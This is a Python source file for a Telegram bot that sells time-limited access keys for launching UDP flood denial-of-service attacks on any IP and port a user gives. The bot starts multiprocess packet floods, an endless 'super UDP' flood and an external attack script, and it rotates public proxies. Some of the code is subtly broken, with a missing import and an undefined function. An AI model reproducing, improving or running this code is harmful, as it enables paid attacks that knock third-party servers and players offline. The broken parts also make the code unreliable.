import socket
import multiprocessing
import logging
import time
import threading
import requests
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import subprocess
import json
import os
import random
import string
import datetime
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
KEY_FILE = "keys.json"

users = {}
keys = {}
user_processes = {}
user_attacks = {}  # To track ongoing UDP attacks

# Proxy related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'

proxy_iterator = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
    return next(proxy_iterator, None)

def get_proxy_dict():
    proxy = get_next_proxy()
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

# 🛠️ Function to send UDP packets
def udp_flood(target_ip, target_port, stop_flag):
    target_port = int(target_port)  # Ensure port is an integer
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
    while not stop_flag.is_set():
        try:
            packet_size = random.randint(64, 1469)  # Random packet size
            data = os.urandom(packet_size)  # Generate random data
            for _ in range(50000):  # Maximize impact by sending more packets
                sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            logging.error(f"Error sending packets: {e}")
            break  # Exit loop on any socket error

# 🚀 Function to start a UDP flood attack
def start_udp_flood(user_id, target_ip, target_port):
    target_port = int(target_port)  # Convert target_port to integer
    stop_flag = multiprocessing.Event()
    processes = []

    # Allow up to 1000 CPU threads for maximum performance
    for _ in range(min(1000, multiprocessing.cpu_count())):
        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
        process.start()
        processes.append(process)

    # Store processes and stop flag for the user
    user_attacks[user_id] = (processes, stop_flag)
    return f"☢️ Launching a powerful attack on {target_ip}:{target_port} 💀"

# 🚀 New Super UDP Function to generate additional UDP traffic
def super_udp(target_ip, target_port):
    target_port = int(target_port)  # Ensure port is an integer
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:  # Continuous traffic
        try:
            packet_size = random.randint(64, 1469)  # Random packet size
            data = os.urandom(packet_size)  # Generate random data
            sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            logging.error(f"Error sending super UDP packets: {e}")
            break  # Exit on any error

# Modified bgmi function to run sharp binary, UDP flood, and super UDP concurrently
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global user_processes
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @SharpX72\nCLICK IN /help")
        return

    if len(context.args) != 3:
        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
        return

    target_ip = context.args[0]
    try:
        port = int(context.args[1])  # Convert port to integer
        duration = int(context.args[2])  # Convert duration to integer
    except ValueError:
        await update.message.reply_text('Invalid port or duration. Please provide numeric values.')
        return

    command = ['python run_attack.py', target_ip, str(port), str(duration)]  # Ensure port and duration are strings when passed to command

    # Run the sharp binary attack (bgmi)
    process = subprocess.Popen(command)
    user_processes[user_id] = {"process": process, "command": command, "target_ip": target_ip, "port": port}

    # Function to run the UDP flood concurrently
    def run_udp_flood():
        udp_message = start_udp_flood(user_id, target_ip, port)
        logging.info(f"UDP Flood: {udp_message}")

    # Function to run the Super UDP attack concurrently
    def run_super_udp():
        super_udp(target_ip, port)

    # Create and start threads for both attacks (UDP flood and Super UDP)
    udp_thread = threading.Thread(target=run_udp_flood)
    super_udp_thread = threading.Thread(target=run_super_udp)

    udp_thread.start()
    super_udp_thread.start()

    await update.message.reply_text(f'Attack started:\nFlooding {target_ip}:{port} for {duration} seconds using sharp binary, UDP flood, and Super UDP. OWNER- @SharpX72')

# Add inbuilt keyboard buttons on bot start
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        ['/bgmi', '/start'],
        ['/stop', '/help']
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    await update.message.reply_text("Welcome! Choose an action:", reply_markup=reply_markup)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key buy key from- @SharpX72\nCLICK IN /help")
        return

    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')
        return

    if user_processes[user_id]["process"].poll() is None:
        await update.message.reply_text('Flooding is already running.')
        return

    user_processes[user_id]["process"] = subprocess.Popen(user_processes[user_id]["command"])
    await update.message.reply_text('Started flooding.')

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key buy key from- @SharpX72\nCLICK IN /help")
        return

    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
        await update.message.reply_text('No flooding process is running.OWNER @SharpX72\nCLICK IN /help')
        return

    user_processes[user_id]["process"].terminate()
    del user_processes[user_id]  # Clear the stored parameters
    
    await update.message.reply_text('Stopped flooding and cleared saved parameters.')

# 📋 Help command with all commands listed
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = """
🔑 This is sharp bot. Here are the available commands:

/redeem <key> - Redeem your access key
/stop - Stop the ongoing attack
/start - Start the flooding with the parameters set
/genkey <hours/days> - Generate a key with time duration
/bgmi <target_ip> <port> <duration> - Start an attack with specified parameters
/ping - Check your connection speed
/uptime - Show bot uptime
/owner - Contact the bot owner
/broadcast <message> - Broadcast a message to all users (Admin only)
/allusers - List all authorized users (Admin only)
    """
    await update.message.reply_text(response)

# Key functions: redeem, genkey, broadcast, and other necessary functions
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"Key generated: {key}\nExpires on: {expiration_date}"
            except ValueError:
                response = "Please specify a valid number and unit of time (hours/days)."
        else:
            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = "ONLY OWNER CAN USE💀OWNER @SharpX72"

    await update.message.reply_text(response)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @SharpX72..."
        else:
            response = "Invalid or expired key buy from @SharpX72."
    else:
        response = "Usage: /redeem <key>"

    await update.message.reply_text(response)

async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = "Authorized Users:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(user_id), request_kwargs={'proxies': get_proxy_dict()})
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
        else:
            response = "No data found"
    else:
        response = "ONLY OWNER CAN USE."
    await update.message.reply_text(response)

# Command handler for /owner
async def owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📞 Contact the owner: @SharpX72")

# 💬 Command handler for /uptime
async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"⏱️ Bot Uptime: {get_uptime()}")

# 💬 Command handler for /ping
async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await update.message.reply_text("Checking your connection speed...")

    # Measure ping time
    start_time = time.time()
    try:
        socket.gethostbyname('google.com')
        ping_time = (time.time() - start_time) * 1000  # Convert to milliseconds
        ping_response = (
            f"Ping: `{ping_time:.2f} ms` ⏱️\n"
            f"Your IP: `{get_user_ip(user_id)}` 📍\n"
            f"Your Username: `{update.message.from_user.username}` 👤\n"
        )
        await update.message.reply_text(ping_response)
    except socket.gaierror:
        await update.message.reply_text("❌ Failed to ping! Check your connection.")

def get_user_ip(user_id):
    try:
        ip_address = requests.get('https://api.ipify.org/').text
        return ip_address
    except:
        return "IP Not Found 🤔"

if __name__ == '__main__':
    load_data()
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("start", start_command))  # Inbuilt keyboard will be shown on start

    # Add new command handlers for /owner, /uptime, and /ping
    app.add_handler(CommandHandler("owner", owner))
    app.add_handler(CommandHandler("uptime", uptime))
    app.add_handler(CommandHandler("ping", ping_command))

    app.run_polling()
